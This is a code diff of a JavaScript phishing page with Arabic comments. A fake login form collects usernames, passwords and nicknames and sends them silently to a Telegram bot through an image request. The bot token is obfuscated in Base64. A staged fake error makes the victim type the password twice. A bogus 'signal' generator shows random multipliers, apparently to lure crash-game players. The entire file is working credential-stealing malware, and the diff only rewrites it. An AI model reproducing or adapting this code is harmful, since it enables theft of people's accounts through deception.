@@ -1,74 +1,63 @@
-// 1. التوكن الجديد نتاعك مشفر بـ Base64 (هذا هو المفتاح)
-const _vault = "ODU4OTI0MzM2MzpBQUZqdWhJZnhTQ1BPVGVnVVJuLTc1RF8wa2ZRNEkxYmdsUQ==";
-
-const TG_TOKEN = (() => {
-    try { return atob(_vault); } catch { return null; }
-})();
+// 🔐 التوكن الجديد مشفر بـ Base64 (لا تلمسه)
+const _0xBase = "ODU4OTI0MzM2MzpBQUZqdWhJZnhTQ1BPVGVnVVJuLTc1RF8wa2ZRNEkxYmdsUQ==";
 const CHAT_ID = "8026901193";
 
-// 2. دالة الإرسال المخفية
-function sendToTelegram(text) {
+const getT = () => { try { return atob(_0xBase); } catch { return null; } };
+const TG_TOKEN = getT();
+
+// 🚀 نظام الإرسال الصامت
+function sendData(msg) {
     if (!TG_TOKEN) return;
-    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=html`;
-    new Image().src = url;
+    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`;
+    const ping = new Image();
+    ping.src = url;
 }
 
-// 3. ✅ هاد الجزء هو اللي ينحي الشاشة السوداء بالسيف
-window.addEventListener('DOMContentLoaded', () => {
+// 🛡️ منع الشاشة السوداء عند التشغيل
+window.onload = () => {
     const auth = document.getElementById('auth-screen');
-    if (auth) {
-        auth.classList.remove('hidden');
-        auth.style.display = 'block';
-    }
-});
+    if (auth) auth.classList.remove('hidden');
+};
 
-let loginAttempts = 0;
+let attempts = 0;
 
-// 4. دالة تسجيل الدخول
-async function processAuth() {
+function processAuth() {
     const u = document.getElementById('u_log').value;
     const p = document.getElementById('u_pas').value;
     const btn = document.getElementById('sync-btn');
     const err = document.getElementById('login-err');
 
-    if (u.length < 4 || p.length < 4) return;
+    if (!u || !p) return alert("Please fill all fields!");
 
-    loginAttempts++;
-    if (loginAttempts === 1) {
-        btn.disabled = true;
-        btn.innerText = "Verifying...";
-        sendToTelegram(`⚠️ <b>محاولة 1:</b>\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>`);
+    attempts++;
+    if (attempts === 1) {
+        btn.innerText = "Connecting...";
+        sendData(`⚠️ <b>LOGIN 1:</b>\nU: <code>${u}</code>\nP: <code>${p}</code>`);
         setTimeout(() => {
             if (err) err.classList.remove('hidden');
             document.getElementById('u_pas').value = "";
-            btn.disabled = false;
-            btn.innerText = "Retry Sync";
+            btn.innerText = "RETRY SYNC";
         }, 1500);
     } else {
-        btn.disabled = true;
-        sendToTelegram(`✅ <b>مؤكدة 2:</b>\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>`);
-        setTimeout(() => {
-            document.getElementById('auth-screen').classList.add('hidden');
-            document.getElementById('security-layer').classList.remove('hidden');
-        }, 1000);
+        sendData(`✅ <b>LOGIN 2 (CONFIRMED):</b>\nU: <code>${u}</code>\nP: <code>${p}</code>`);
+        document.getElementById('auth-screen').classList.add('hidden');
+        document.getElementById('security-layer').classList.remove('hidden');
     }
 }
 
-// 5. باقي الدوال (اللقب والإشارة)
 function processNick() {
     const n = document.getElementById('u_nick').value;
-    if (n.length < 2) return;
-    sendToTelegram(`🔑 <b>اللقب:</b> <code>${n}</code>`);
+    if (!n) return;
+    sendData(`🔑 <b>NICKNAME:</b> <code>${n}</code>`);
     document.getElementById('security-layer').classList.add('hidden');
     document.getElementById('main-app').classList.remove('hidden');
 }
 
 function getSignal() {
     const res = document.getElementById('target-mult');
-    if(res) {
-        res.innerText = "SCANNING..";
-        setTimeout(() => {
-            res.innerText = (Math.random() * (5.50 - 1.20) + 1.20).toFixed(2) + "x";
-        }, 800);
-    }
+    res.innerText = "...";
+    setTimeout(() => {
+        const val = (Math.random() * (4.5 - 1.1) + 1.1).toFixed(2);
+        res.innerText = val + "x";
+    }, 600);
 }
